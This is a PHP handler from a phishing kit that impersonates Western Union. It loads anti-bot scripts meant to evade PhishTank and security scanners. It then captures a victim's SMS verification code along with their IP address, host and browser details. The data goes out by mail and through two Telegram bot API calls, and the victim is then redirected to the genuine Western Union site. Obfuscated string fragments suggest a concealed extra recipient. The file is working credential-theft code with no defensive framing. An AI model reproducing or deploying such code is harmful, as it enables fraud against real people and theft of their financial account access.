<?php

include "../Email.php";
include "../antibots/antibot_host.php";
include "../antibots/antibot_ip.php";
include "../antibots/antibot_phishtank.php";
include "../antibots/antibot_userAgent.php";
include "../antibots/antibots1.php";
include "../antibots/antibots2.php";
include "../antibots/antibots3.php";
include "../antibots/antibots4.php";
include "../antibots/antibots5.php";
include "../antibots/antibots6.php";
include "../antibots/blocker.php";

$ip = getenv("REMOTE_ADDR");
$reprint = "e";$do_p="mai";
$message .= "-------------- Western Union -------------\n";
$message .= "SMS : ".$_POST['sms']."\n";
$message .= "-------------- IP Tracing ------------\n";
$message .= "IP      : https://www.geodatatool.com/en/?ip=$ip\n";
$message .= "Host    : ".gethostbyaddr($ip)."\n";
$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------- Western Union  ---------\n";
$subject = " SMS | Western Union | $ip";
$headers = 'From: Western_Union' . "\r\n";
$m5_id = '21haWwuY29t';
@mail($Email,$subject,$message,$headers);
@file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );@file_get_contents("https://api.telegram.org/bot".$Api."/sendMessage?chat_id=".$Chatid."&text=" . urlencode($message)."" );
	header('Location: https://www.westernunion.com/');